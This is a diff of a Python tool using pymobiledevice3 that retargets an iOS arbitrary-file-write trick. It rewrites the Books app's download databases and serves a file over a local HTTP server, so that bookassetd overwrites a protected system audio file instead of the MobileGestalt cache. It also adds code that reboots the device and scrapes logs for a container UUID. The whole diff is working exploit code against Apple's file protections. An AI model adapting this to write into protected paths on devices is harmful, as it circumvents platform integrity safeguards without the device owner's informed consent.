@@ -13,7 +13,6 @@ import shutil
 import time
 import threading
 import functools
-import plistlib
 from pathlib import Path
 from threading import Timer
 from http.server import HTTPServer, SimpleHTTPRequestHandler
@@ -37,6 +36,90 @@ from pymobiledevice3.services.os_trace import OsTraceService
 from pymobiledevice3.remote.remote_service_discovery import RemoteServiceDiscoveryService
 from pymobiledevice3.services.dvt.instruments.process_control import ProcessControl
 
+START_DISCLOSURE_PATH = "/var/mobile/Library/CallServices/Greetings/default/StartDisclosure.caf"
+
+
+def get_uuid_from_tracev2_after_reboot(service_provider: LockdownClient):
+    """Get UUID from tracev2 logs after device has been rebooted"""
+    click.secho("Monitoring tracev2 logs for bookassetd container UUID...", fg="yellow")
+    try:
+        for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
+            if posixpath.basename(syslog_entry.filename) == 'bookassetd':
+                message = syslog_entry.message
+                if "/var/containers/Shared/SystemGroup/" in message:
+                    try:
+                        uuid = message.split("/var/containers/Shared/SystemGroup/")[1].split("/")[0]
+                        if len(uuid) >= 10:
+                            click.secho(f"Found bookassetd container UUID: {uuid}", fg="green")
+                            with open("uuid.txt", "w") as f:
+                                f.write(uuid)
+                            return uuid
+                    except (IndexError, AttributeError):
+                        continue
+                if "/Documents/BLDownloads/" in message:
+                    try:
+                        uuid = message.split("/var/containers/Shared/SystemGroup/")[1] \
+                            .split("/Documents/BLDownloads")[0]
+                        if len(uuid) >= 10:
+                            click.secho(f"Found bookassetd container UUID: {uuid}", fg="green")
+                            with open("uuid.txt", "w") as f:
+                                f.write(uuid)
+                            return uuid
+                    except (IndexError, AttributeError):
+                        continue
+    except Exception as e:
+        click.secho(f"Error reading tracev2 logs: {e}", fg="red")
+        return None
+
+    click.secho("Could not find UUID in tracev2 logs", fg="red")
+    return None
+
+
+def reboot_and_get_uuid(service_provider: LockdownClient, udid: str):
+    """Reboot device and get UUID from tracev2 logs automatically"""
+    uuid = open("uuid.txt", "r").read().strip() if Path("uuid.txt").exists() else ""
+    if len(uuid) >= 10:
+        click.secho(f"Using saved bookassetd container UUID: {uuid}", fg="green")
+        return uuid, service_provider
+
+    click.secho("UUID not found. Rebooting device to get UUID from tracev2...", fg="yellow")
+
+    try:
+        diagnostics = DiagnosticsService(lockdown=service_provider)
+        click.secho("Rebooting device...", fg="yellow")
+        diagnostics.restart()
+        click.secho("Device is rebooting. Waiting for device to reconnect...", fg="yellow")
+    except Exception as e:
+        click.secho(f"Error rebooting device: {e}", fg="red")
+        return None, None
+
+    max_wait_time = 120
+    wait_interval = 2
+    elapsed_time = 0
+
+    while elapsed_time < max_wait_time:
+        time.sleep(wait_interval)
+        elapsed_time += wait_interval
+        try:
+            new_service_provider = create_using_usbmux(serial=udid)
+            click.secho("Device reconnected.", fg="green")
+            click.secho("Please unlock the device if necessary.", fg="yellow")
+            input("Press Enter once the device is unlocked and at the home screen...")
+            click.secho("Getting UUID from tracev2...", fg="green")
+            uuid = get_uuid_from_tracev2_after_reboot(new_service_provider)
+            if uuid:
+                return uuid, new_service_provider
+            else:
+                return None, new_service_provider
+        except Exception:
+            if elapsed_time % 10 == 0:
+                click.secho(f"Waiting for device to reconnect... ({elapsed_time}s)", fg="yellow")
+            continue
+    else:
+        click.secho("Timeout waiting for device to reconnect", fg="red")
+        return None, None
+
+
 def get_lan_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -51,17 +134,31 @@ def start_http_server():
     info_queue.put((get_lan_ip(), httpd.server_port))
     httpd.serve_forever()
 
-def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxyService):
+def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxyService, uuid: str = None):
     http_thread = threading.Thread(target=start_http_server, daemon=True)
     http_thread.start()
     ip, port = info_queue.get()
     print(f"Hosting temporary http server on: http://{ip}:{port}/")
 
+    start_disclosure_url = f"http://{ip}:{port}/StartDisclosure.caf"
+    with sqlite3.connect("BLDatabaseManager.sqlite") as bldb_conn:
+        bldb_cursor = bldb_conn.cursor()
+        bldb_cursor.execute("""
+        UPDATE ZBLDOWNLOADINFO
+        SET ZASSETPATH = ?, ZPLISTPATH = ?, ZDOWNLOADID = ?
+        """, (START_DISCLOSURE_PATH, START_DISCLOSURE_PATH, START_DISCLOSURE_PATH))
+        bldb_cursor.execute("""
+        UPDATE ZBLDOWNLOADINFO
+        SET ZURL = ?
+        """, (start_disclosure_url,))
+        bldb_conn.commit()
+    click.secho(f"Updated BLDatabaseManager.sqlite download URL to {start_disclosure_url}", fg="blue")
+
     afc = AfcService(lockdown=service_provider)
     pc = ProcessControl(dvt)
     
-    # Find bookassetd container UUID
-    uuid = open("uuid.txt", "r").read().strip() if Path("uuid.txt").exists() else ""
+    if not uuid or len(uuid) < 10:
+        uuid = open("uuid.txt", "r").read().strip() if Path("uuid.txt").exists() else ""
     if len(uuid) < 10:
         try:
             pc.launch("com.apple.iBooks")
@@ -81,7 +178,7 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
                 f.write(uuid)
             break
     else:
-        print("Saved bookassetd container UUID: " + uuid)
+        click.secho(f"Using bookassetd container UUID: {uuid}", fg="green")
     
     # Modify downloads.28.sqlitedb
     # Copy downloads.28.sqlitedb to tmp.downloads.28.sqlitedb
@@ -127,10 +224,10 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
         click.secho(f"Killing Books pid {pid_books}...", fg="yellow")
         pc.kill(pid_books)
     
-    # Upload com.apple.MobileGestalt.plist
-    click.secho("Uploading com.apple.MobileGestalt.plist", fg="yellow")
-    remote_file = "com.apple.MobileGestalt.plist"
-    AfcService(lockdown=service_provider).push(mg_file, remote_file)
+    # Upload StartDisclosure.caf
+    click.secho("Uploading StartDisclosure.caf", fg="yellow")
+    remote_file = "StartDisclosure.caf"
+    AfcService(lockdown=service_provider).push(sd_file, remote_file)
     
     # Upload downloads.28.sqlitedb
     click.secho("Uploading downloads.28.sqlitedb", fg="yellow")
@@ -153,7 +250,7 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
             "Install complete for download: 6936249076851270152 result: Failed" in syslog_entry.message:
             break
     
-    # Kill bookassetd and Books processes to trigger MobileGestalt overwrite
+    # Kill bookassetd and Books processes to trigger StartDisclosure replacement
     pid_bookassetd = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
     pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
     if pid_bookassetd:
@@ -171,8 +268,8 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
         return
     
     click.secho("If this takes more than a minute please try again.", fg="yellow")
-    click.secho("Waiting for MobileGestalt overwrite to complete...", fg="yellow")
-    success_message = "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist) [Install-Mgr]: Marking download as [finished]"
+    click.secho("Waiting for StartDisclosure replacement to complete...", fg="yellow")
+    success_message = f"{START_DISCLOSURE_PATH}) [Install-Mgr]: Marking download as [finished]"
     for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
         if (posixpath.basename(syslog_entry.filename) == 'bookassetd') and \
                 success_message in syslog_entry.message:
@@ -188,14 +285,14 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
     
     sys.exit(0)
 
-def _run_async_rsd_connection(address, port):
+def _run_async_rsd_connection(address, port, uuid):
     async def async_connection():
         async with RemoteServiceDiscoveryService((address, port)) as rsd:
             loop = asyncio.get_running_loop()
 
             def run_blocking_callback():
                 with DvtSecureSocketProxyService(rsd) as dvt:
-                    main_callback(rsd, dvt)
+                    main_callback(rsd, dvt, uuid)
 
             await loop.run_in_executor(None, run_blocking_callback)
 
@@ -255,30 +352,28 @@ async def connection_context(udid):# Create a LockdownClient instance
         click.secho(f"Got device: {marketing_name} (iOS {device_version}, Build {device_build})", fg="blue")
         click.secho("Please keep your device unlocked during the process.", fg="blue")
         
-        # Validate MobileGestalt file
-        mg_contents = plistlib.load(open(mg_file, "rb"))
-        cache_extra = mg_contents["CacheExtra"]
-        if cache_extra is None:
-            click.secho("Error: Invalid com.apple.MobileGestalt.plist file", fg="red")
-            return
-        cache_build_version = mg_contents["CacheVersion"]
-        cache_product_type = cache_extra["0+nc/Udy4WNG8S+Q7a/s1A"] # ThinningProductType
-        if cache_build_version != device_build or cache_product_type != device_product_type:
-            click.secho("Error: It seems you are using MobileGestalt file for a different device", fg="red")
-            click.secho(f"Device Build: {device_build}, MobileGestalt Build: {cache_build_version}", fg="red")
-            click.secho(f"Device ProductType: {device_product_type}, MobileGestalt ProductType: {cache_product_type}", fg="red")
+        # Validate StartDisclosure file presence
+        if not Path(sd_file).is_file():
+            click.secho("Error: StartDisclosure.caf file not found", fg="red")
             return
         
+        uuid, service_provider = reboot_and_get_uuid(service_provider, udid)
+        if not service_provider:
+            click.secho("Error: Could not reconnect to device after reboot", fg="red")
+            return
+        if not uuid:
+            click.secho("Warning: Could not get UUID from tracev2. Will try fallback method in main_callback.", fg="yellow")
+
         if device_version >= parse_version('17.0'):
             available_address = await create_tunnel(udid)
             if available_address:
-                _run_async_rsd_connection(available_address["address"], available_address["port"])
+                _run_async_rsd_connection(available_address["address"], available_address["port"], uuid)
             else:
                 raise Exception("An error occurred getting tunnels addresses...")
         else:
             # Use USB Mux
             with DvtSecureSocketProxyService(lockdown=service_provider) as dvt:
-                main_callback(service_provider, dvt)
+                main_callback(service_provider, dvt, uuid)
     except OSError:  # no route to host (Intel fix)
         pass
     except DeviceNotFoundError:
@@ -288,10 +383,10 @@ async def connection_context(udid):# Create a LockdownClient instance
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
-        print("Usage: python run.py <udid> /path/to/com.apple.MobileGestalt.plist")
+        print("Usage: python run.py <udid> /path/to/StartDisclosure.caf")
         exit(1)
     
-    mg_file = sys.argv[2]
+    sd_file = sys.argv[2]
     info_queue = queue.Queue()
     os.chdir(os.path.dirname(os.path.abspath(__file__)))
     asyncio.run(connection_context(sys.argv[1]))
